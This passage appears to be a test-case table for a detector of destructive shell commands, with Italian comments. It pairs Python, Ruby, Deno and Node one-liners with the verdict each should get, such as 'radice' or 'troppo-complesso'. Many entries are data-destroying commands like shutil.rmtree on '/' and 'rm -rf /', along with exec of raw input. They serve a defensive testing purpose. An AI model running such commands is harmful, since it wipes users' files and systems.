  [`python -c "import os, shutil; shutil.rmtree(os.path.realpath('/finto/casa', strict=False))"`, 'casa'],
  [`python -c "import os, shutil; shutil.rmtree(os.path.join(os.path.join(os.path.join(os.path.join(os.path.join('/finto', 'casa'))))))"`, 'casa'],
  [`python -c "import subprocess, os; subprocess.run(['rm', '-rf', os.path.join(x, 'y')])"`, 'troppo-complesso'],
  [`python -c "import os, shutil; shutil.rmtree(os.getenv())"`, 'troppo-complesso'],
  [`python -c "import shutil, pathlib; [shutil.rmtree(p) for p in pathlib.Path('/').glob(x)]"`, 'troppo-complesso'],
  [`python -c "import shutil, pathlib; shutil.rmtree(pathlib.Path('/finto').joinpath('casa').resolve())"`, 'casa'],
  /* i legami: catena, un legame che non si legge in una lista, troppi valori, troppi legami, una tupla */
  [`python -c "import shutil; a = '/'; b = a; c = b; d = c; e = d; shutil.rmtree(e)"`, 'radice'],
  [`python -c "import subprocess; d = a if b else c; subprocess.run(['rm', '-rf', d])"`, 'troppo-complesso'],
  [`python -c "import subprocess, tempfile; d = tempfile.mkdtemp(); subprocess.run(['rm', '-rf', d])"`, 'troppo-complesso'],
  [`python -c "import subprocess, tempfile; d = tempfile.mkdtemp(); subprocess.Popen('rm -rf ' + d)"`, 'troppo-complesso'],
  [`python -c "import shutil; [shutil.rmtree(d) for d in [${"'a', ".repeat(16)}'/']]"`, 'troppo-complesso'],
  [`python -c "import shutil; ${'x = 1; '.repeat(300)}d = '/'; shutil.rmtree(d)"`, 'troppo-complesso'],
  [`python -c "import shutil; d = '/', 'x'; shutil.rmtree(d)"`, 'troppo-complesso'],
  [`python -c "import os; os.system(x)"`, null],
  [`python -c "c = input(); exec(c)"`, 'troppo-complesso'],
  [`deno eval "const d = Deno.makeTempDirSync(); new Deno.Command('rm', { args: ['-rf', d] }).outputSync()"`, 'troppo-complesso'],
  /* R1: un simbolo da solo, un nome scelto con una stringa che cancella; fs-extra solo se è fs-extra */
  [`ruby -e 'obj = Object.new; obj.send(:system, ARGV[0])' x`, 'troppo-complesso'],
  [`python -c "getattr(obj, 'go')('rm -rf /')"`, 'troppo-complesso'],
  [`node -e "const { readFileSync: r } = require('fs-extra'); r('/finto')"`, null],
  [`node --input-type=module -e "import _ from 'lodash'; _.remove([1], (n) => n)"`, null],
  /* secondo giro dei mutanti: un argomento con due valori, un pezzo che manca nella lista, un nome con la maiuscola, i legami persi oltre il tetto */
  [`python -c "import shutil, pathlib; [shutil.rmtree(pathlib.Path(d)) for d in ['a', '/']]"`, 'troppo-complesso'],
  [`python -c "import subprocess, pathlib; subprocess.run(['rm', '-rf', pathlib.Path('/').joinpath(x)])"`, 'troppo-complesso'],
  [`python -c "import subprocess, pathlib; subprocess.run(['rm', '-rf', pathlib.Path('/').joinpath()])"`, 'troppo-complesso'],
  [`python -c "import shutil; d = Config.target; shutil.rmtree(d)"`, 'troppo-complesso'],
  [`python -c "import shutil; d = 'a'; ${'x = 1; '.repeat(300)}d = '/'; shutil.rmtree(d)"`, 'troppo-complesso'],
  [`python -c "import shutil; d = 'a'; ${'with a() as x: pass; '.repeat(300)}d = '/'; shutil.rmtree(d)"`, 'troppo-complesso'],
  [`python -c "import subprocess, tempfile; d = tempfile.mkdtemp(); subprocess.call('rm', d)"`, 'troppo-complesso'],
  /* il tetto della shell resta dov'era */
  [nido(`rm -rf /finto/casa`, 4), 'casa'],
]
